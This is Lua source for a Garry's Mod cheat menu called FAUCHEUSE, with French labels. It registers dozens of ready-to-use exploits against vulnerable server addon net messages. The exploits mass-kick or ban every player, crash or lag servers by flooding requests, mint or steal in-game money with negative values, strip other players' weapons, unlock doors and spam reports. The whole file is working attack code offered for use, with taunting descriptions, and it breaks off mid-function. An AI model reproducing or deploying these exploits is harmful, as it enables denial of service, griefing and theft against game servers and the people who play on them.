FAUCHEUSE.AddExploit( "Supprimer les props 2", {
desc = "",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
FAUCHEUSE.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick 3", {
desc = "Exploit pour kick tous les joueurs",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Kick", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick 2", {
desc = "Exploit pour kick",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Kick", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Loot Items", {
desc = "Auto-Loot des items",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Loot", func = function()
for k, v in pairs(ents.GetAll()) do         
if v:GetClass() == "item_loot" then                 
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick tout le monde", {
desc = "Exploit pour kick tous les joueurs",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Kick", func = function()
if !timer.Exists( "kickallnoob" ) then
FAUCHEUSE.ChatText( "Kick tout le monde lancé" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do 
FAUCHEUSE.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
FAUCHEUSE.ChatText( "Kick tout le monde stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick 1", {
desc = "Exploit pour kick les Admins",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Kick", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart('plyWarning')          
net.WriteEntity(v)          
net.WriteString('You have to select a player before doing a action.')       
net.SendToServer()
FAUCHEUSE.ChatText("Tentative de kick sur ".. v:Nick().. "!")
end
end, },
},
} )
FAUCHEUSE.AddExploit( "NLR Freeze", {
desc = "Exploit pour freeze des joueurs",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Freeze", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )
FAUCHEUSE.AddExploit( "Supprimer les props 1", {
desc = "Supprimer touts les props du serveur x)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
for k,v in pairs(ents.GetAll()) do
FAUCHEUSE.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Hack Keypads", {
desc = "Cracker les keypads instantanément.",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Hacker", func = function()
FAUCHEUSE.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Kart System €", {
desc = "Exploit d'argent.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for i=1, 300 do
FAUCHEUSE.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Farming Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   FAUCHEUSE.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Point Shop €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart("ClickerAddToPoints")
net.WriteInt(FAUCHEUSE.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
FAUCHEUSE.AddExploit( "Body Groups", {
desc = "Changer de skin",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Changer", func = function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1   
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
FAUCHEUSE.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Hitman X €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Donner", func = function()
local t = FAUCHEUSE.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -FAUCHEUSE.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
hook.Remove( "HUDPaint", "skhdsakjl")
local t = FAUCHEUSE.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( FAUCHEUSE.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Bail Out €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Donner", func = function()
local t = FAUCHEUSE.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = FAUCHEUSE.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( FAUCHEUSE.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Tow Truck €", {
desc = "Spawn vehicule dépanneur / Exploit d'argent Regarder le vehicule qui possède une amande",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn Dépanneuse", func = function()
FAUCHEUSE.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Argent Exploit", func = function()
for k,v in pairs(ents.GetAll()) do 
FAUCHEUSE.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-FAUCHEUSE.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Fire Truck", {
desc = "Spawn camion de pompier",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
FAUCHEUSE.NetStart("FIRE_CreateFireTruck")
net.SendToServer()    
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Hit Menu €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart("hitcomplete")
net.WriteDouble(FAUCHEUSE.GetStored( "montant_argent18" ))               
net.SendToServer()      
end, },
},
} )
FAUCHEUSE.AddExploit( "€ HHH €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
local plyhhh = LocalPlayer()              
for k,v in pairs(player.GetAll()) do                
dahater = v   
end        
if dahater != plyhhh then       
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
FAUCHEUSE.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
FAUCHEUSE.ChatText( "Cette version de HHH n'est pas exploitable !" )    
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ DaHit €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Donner", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()  
end  
end, },
{ typ = "func", name = "Enlever", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end, },
{ typ = "func", name = "Spam Prendre", func = function()
if !timer.Exists( "Reaper_exploit_spamdahitprendre" ) then
FAUCHEUSE.ChatText( "Spam lancé" )
timer.Create( "Reaper_exploit_spamdahitprendre", 1, 0, function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Reaper_exploit_spamdahitprendre" )
FAUCHEUSE.ChatText( "Spam stoppé" )
end
end, },
{ typ = "func", name = "Spam Enlever", func = function()
if !timer.Exists( "Reaper_exploit_spamdahitenlever" ) then
FAUCHEUSE.ChatText( "Spam lancé" )
timer.Create( "Reaper_exploit_spamdahitenlever", 1, 0, function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Reaper_exploit_spamdahitenlever" )
FAUCHEUSE.ChatText( "Spam stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Anti-Printer", {
desc = "Appliquez des dommages constants aux Printers à proximité",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Reaper_exploit_printersmasher" ) then
FAUCHEUSE.ChatText( "Anti-Printer lancé" )
timer.Create( "Reaper_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
FAUCHEUSE.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "Reaper_exploit_printersmasher" )
FAUCHEUSE.ChatText( "Anti-Printer stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Crash le Serveur", {
desc = "Comme sont nom l'indique niquez moi ce serveur de la",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
FAUCHEUSE.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Munition Gratuite", {
desc = "Vous donne des munitions pour toutes vos armes",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(GAMEMODE.AmmoTypes) do
FAUCHEUSE.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Advanced Money Printer €", {
desc = "Voler tout l'argent des printers",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
FAUCHEUSE.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "gBan Ban tout le monde", {
desc = "Exploit pout bannir tout le monde sauf toi ^^, exploit trouvé dans une ancienne version de gBan",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then       
FAUCHEUSE.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Des poutous partout" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Lag Exploit #1", {
desc = "L'admin devrait avoir honte de faire payer un VIP.",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit1" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
FAUCHEUSE.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
FAUCHEUSE.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
FAUCHEUSE.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit1" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Console Spam", {
desc = "Spam la console et peut éventuellement créé des lags",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Reaper_exploit_bigspames2" ) then
FAUCHEUSE.ChatText( "Spam et lag lancé." )
timer.Create( "Reaper_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u forget your promess forever but sorry you are a friend" )
end
end)
else
timer.Remove( "Reaper_exploit_bigspames2" )
FAUCHEUSE.ChatText( "Spam et lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Keypads Lags", {
desc = "Clique pour mettre en PLS le serveur!",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit4" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
FAUCHEUSE.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit4" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Console Spam", {
desc = "Supposé être un lag exploit mais ne provoque pas de lags, juste des spams console",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Reaper_exploit_bigspames2" ) then
FAUCHEUSE.ChatText( "Spam et lag lancé." )
timer.Create( "Reaper_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u forget your promess forever but sorry you are a friend" )
end
end)
else
timer.Remove( "Reaper_exploit_bigspames2" )
FAUCHEUSE.ChatText( "Spam et lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Bouton Innutile", {
desc = "Faire totalement bug le jeu d'un autre ? Pas mal :')",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "nostrip" ) end,
functions = {
{ typ = "players", addr = "casserjeu" },
{ typ = "func", name = "Casser Le Jeu", func = function()
if !timer.Exists( "trollishere" ) then
FAUCHEUSE.ChatText( "Ultra Bug Lancé !" )
timer.Create( "trollishere", 0.02, 0, function()
for i = 1, 300 do
FAUCHEUSE.NetStart( "nostrip" )
net.WriteString( "RunConsoleCommand(\"troll\")" )
net.SendToServer()
end
end)
else
timer.Remove( "trollishere" )
FAUCHEUSE.ChatText( "Ultra Bug Stoppé !" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Lag Exploit #3", {
desc = "Faire lag le serveur comme s'il était hébergé en Afrique",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit5" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
FAUCHEUSE.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit5" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Lag Exploit #4", {
desc = "Il doit y en avoir des merdes dans ce serveur !",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit6" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
FAUCHEUSE.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit6" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Crash Lags Stacker", {
desc = "Faire crash un serveur sans props ? Cool :D",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Big Lags", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit7" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
FAUCHEUSE.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit7" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Réanimation Exploit", {
desc = "Vous etes automatiquement réanimé après avoir été tué",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortel :)", func = function()
if !timer.Exists( "Reaper_exploit_zombie" ) then
FAUCHEUSE.ChatText( "Tu es Immortel" )
timer.Create( "Reaper_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
FAUCHEUSE.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_zombie" )
FAUCHEUSE.ChatText( "Tu es redevenu Mortel!" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Armory Robbery", {
desc = "Prenez les armes de la police à l'armurerie (Vous devez etre proche d'elle), a un temps de recharge de 5 minutes",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Prendre Arme 1", func = function()
FAUCHEUSE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 2", func = function()
FAUCHEUSE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 3", func = function()
FAUCHEUSE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Admin Stick / Porte exploit", {
desc = "Déverrouiller / Verrouiller Porte / Enlever le proprio (vous devez regarder une porte)",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Déverrouiller", func = function()
FAUCHEUSE.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Verrouiller", func = function()
FAUCHEUSE.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Enlever le Proprio", func = function()
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
FAUCHEUSE.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Reaper Report Spammer", {
desc = "Envoyer des Report sur tout le monde",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Report Tout le Monde", func = function()
for k, v in pairs( player.GetAll() ) do
FAUCHEUSE.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVEUR CODER AVEC LE Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "SAC Crash", {
desc = "Fait instantanément Crash n'importe quel serveur exécutant la simplicité anticheat",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,400 do
tbl[i] = i
end
FAUCHEUSE.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Crash Serveur", {
desc = "Cliquez sur ce bouton pour Crash le serveur instantanément.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
FAUCHEUSE.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
FAUCHEUSE.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
FAUCHEUSE.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
FAUCHEUSE.AddExploit( "Strip les armes", {
desc = "Supprimer les armes de n'importes qui.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "string", name = "Type d'Arme à Strip", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
if !timer.Exists( "stripclub" ) then
FAUCHEUSE.ChatText( "Strip Activé" )
timer.Create( "stripclub", 0.5, 0, function()
local t = FAUCHEUSE.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = FAUCHEUSE.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
FAUCHEUSE.ChatText( "Strip Desactivé" )
end
end, },
},
} )
function FAUCHEUSE.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y + 15 )
TButton:SetFont( "TargetIDSmall" )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 26 )
